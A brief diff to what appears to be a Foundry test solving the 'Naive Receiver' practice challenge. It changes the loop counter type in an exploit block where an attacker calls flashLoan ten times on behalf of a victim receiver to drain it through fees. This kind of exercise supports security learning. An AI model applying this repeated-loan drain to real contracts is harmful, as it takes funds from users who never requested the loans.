@@ -49,7 +49,7 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
-        for (uint256 i = 0; i < 10; i++) {
+        for (uint8 i = 0; i < 10; i++) {
             naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18);
         }
         vm.stopPrank();
